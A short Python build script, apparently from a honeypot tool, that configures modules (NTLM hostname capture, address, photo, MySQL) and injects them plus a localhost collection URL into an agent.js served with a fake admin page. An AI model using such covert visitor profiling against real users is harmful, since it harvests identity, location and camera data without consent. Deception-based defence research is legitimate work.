# 配置开启的模块,内置login(NTLM 获取主机名), address(获取地址), photo(获取照片), mysql 模块, 默认开启无需权限的 login 模块
module = ["login", "mysql"]
# 配置检测攻击者的地址
hack = "http://127.0.0.1:8080/cert"
mysql_port = 3306

with open('agent.js', 'r', encoding='utf-8') as f:
    js = f.read()

with open('admin.html', 'r', encoding='utf-8') as f:
    html = f.read()
js = js.replace("{hack}", hack)
modules = ""
for i in module:
    modules = modules + i + '();'
js = js.replace("{module}", modules)
if 'mysql' in module:
    js = js.replace("{mysql}", "mysql();")
else:
    js = js.replace("{mysql}", "")